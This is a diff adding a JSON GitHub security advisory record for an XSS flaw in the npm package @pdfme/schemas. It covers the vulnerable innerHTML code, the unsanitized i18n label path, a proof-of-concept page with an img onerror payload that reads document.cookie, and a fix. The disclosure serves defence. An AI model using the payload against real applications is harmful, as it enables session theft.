@@ -1,0 +1,46 @@
+{
+  "Severity": "MODERATE",
+  "UpdatedAt": "2026-03-20T20:45:09Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "@pdfme/schemas"
+  },
+  "Advisory": {
+    "DatabaseId": 343770,
+    "Id": "GSA_kwCzR0hTQS14Z3g0LTJ3Z3YtNGpobc4ABT7a",
+    "GhsaId": "GHSA-xgx4-2wgv-4jhm",
+    "References": [
+      {
+        "Url": "https://github.com/pdfme/pdfme/security/advisories/GHSA-xgx4-2wgv-4jhm"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-xgx4-2wgv-4jhm"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-xgx4-2wgv-4jhm"
+      }
+    ],
+    "Description": "## Summary\n\nThe multiVariableText property panel in `@pdfme/schemas` constructs HTML via string concatenation and assigns it to `innerHTML` using unsanitized i18n label values. An attacker who can control label overrides passed through `options.labels` can inject arbitrary JavaScript that executes in the context of any user who opens the Designer and selects a multiVariableText field with no `{variables}` in its text.\n\n## Details\n\nWhen a user selects a multiVariableText schema field that contains no `{variable}` placeholders, the property panel renders instructional text by concatenating i18n-translated strings directly into `innerHTML`.\n\n**Vulnerable sink** — `packages/schemas/src/multiVariableText/propPanel.ts:65-71`:\n\n```typescript\n// Use safe string concatenation for innerHTML\nconst typingInstructions = i18n('schemas.mvt.typingInstructions');\nconst sampleField = i18n('schemas.mvt.sampleField');\npara.innerHTML =\n  typingInstructions +\n  ` \u003ccode style=\"color:${safeColorValue}; font-weight:bold;\"\u003e{` +\n  sampleField +\n  '}\u003c/code\u003e';\n```\n\nThe comment on line 64 claims \"safe string concatenation\" but the result is assigned to `innerHTML` with no HTML escaping applied to `typingInstructions` or `sampleField`.\n\n**i18n lookup has no escaping** — `packages/ui/src/i18n.ts:903`:\n\n```typescript\nexport const i18n = (key: keyof Dict, dict?: Dict) =\u003e (dict || getDict(DEFAULT_LANG))[key];\n```\n\nThis is a plain dictionary lookup — no HTML encoding or sanitization.\n\n**Label override via deep merge** — `packages/ui/src/components/AppContextProvider.tsx:57-63`:\n\n```typescript\nlet dict = getDict(lang);\nif (options.labels) {\n  dict = deepMerge(\n    dict as unknown as Record\u003cstring, unknown\u003e,\n    options.labels as unknown as Record\u003cstring, unknown\u003e,\n  ) as typeof dict;\n}\n```\n\nUser-supplied `options.labels` values are deep-merged into the i18n dictionary with no content sanitization. The Zod schema validates labels as `z.record(z.string(), z.string())` — enforcing type but not content safety.\n\n**Inconsistency:** The color value on lines 58-62 is explicitly validated with a regex allowlist, demonstrating security awareness. The i18n string values were simply overlooked.\n\n## PoC\n\n1. **Create a minimal app that passes attacker-controlled labels:**\n\n```html\n\u003chtml\u003e\n\u003cbody\u003e\n\u003cdiv id=\"designer-container\" style=\"width:100%;height:700px;\"\u003e\u003c/div\u003e\n\u003cscript type=\"module\"\u003e\nimport { Designer } from '@pdfme/ui';\nimport { multiVariableText } from '@pdfme/schemas';\n\nconst template = {\n  basePdf: { width: 210, height: 297, padding: [10, 10, 10, 10] },\n  schemas: [[{\n    type: 'multiVariableText',\n    name: 'field1',\n    text: 'plain text with no variables',\n    content: '{}',\n    variables: [],\n    position: { x: 20, y: 20 },\n    width: 100,\n    height: 20,\n    readOnly: true,\n  }]],\n};\n\nnew Designer({\n  domContainer: document.getElementById('designer-container'),\n  template,\n  plugins: { multiVariableText },\n  options: {\n    labels: {\n      'schemas.mvt.typingInstructions':\n        '\u003cimg src=x onerror=\"document.title=document.cookie\"\u003eInject: ',\n      'schemas.mvt.sampleField': 'safe',\n    },\n  },\n});\n\u003c/script\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\n2. **Open the application in a browser.**\n\n3. **Click on the multiVariableText field** (`field1`) in the Designer canvas to select it.\n\n4. **Observe:** The property panel renders the injected HTML. The `onerror` handler executes, setting `document.title` to the page's cookies. In a real attack, this would exfiltrate session tokens to an attacker-controlled server.\n\n## Impact\n\n- **Session hijacking:** Attacker-injected JavaScript can steal authentication cookies and tokens from any user who opens the Designer.\n- **DOM manipulation:** The injected script runs in the application's origin, allowing phishing overlays, form hijacking, or data exfiltration.\n- **Stored XSS potential:** In multi-tenant applications where labels are stored in a database or fetched from an API, a single poisoned label entry affects all users who subsequently open the Designer.\n- **Scope change:** The XSS payload executes in the embedding application's browser context, escaping the pdfme component's security boundary.\n\n## Recommended Fix\n\nReplace `innerHTML` with safe DOM APIs in `packages/schemas/src/multiVariableText/propPanel.ts`:\n\n```typescript\n// BEFORE (vulnerable):\npara.innerHTML =\n  typingInstructions +\n  ` \u003ccode style=\"color:${safeColorValue}; font-weight:bold;\"\u003e{` +\n  sampleField +\n  '}\u003c/code\u003e';\n\n// AFTER (safe):\npara.appendChild(document.createTextNode(typingInstructions + ' '));\nconst codeEl = document.createElement('code');\ncodeEl.style.color = safeColorValue;\ncodeEl.style.fontWeight = 'bold';\ncodeEl.textContent = `{${sampleField}}`;\npara.appendChild(codeEl);\n```\n\nThis ensures that i18n label values are always treated as text content, never parsed as HTML, regardless of their source.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-03-20T20:45:08Z",
+    "Severity": "MODERATE",
+    "Summary": "PDFME  has XSS via Unsanitized i18n Label Injection into innerHTML in multiVariableText propPanel",
+    "UpdatedAt": "2026-03-20T20:45:09Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 4.4,
+      "VectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:L/I:L/A:N"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "5.5.10"
+      },
+      "VulnerableVersionRange": "\u003c= 5.5.9"
+    }
+  ]
+}
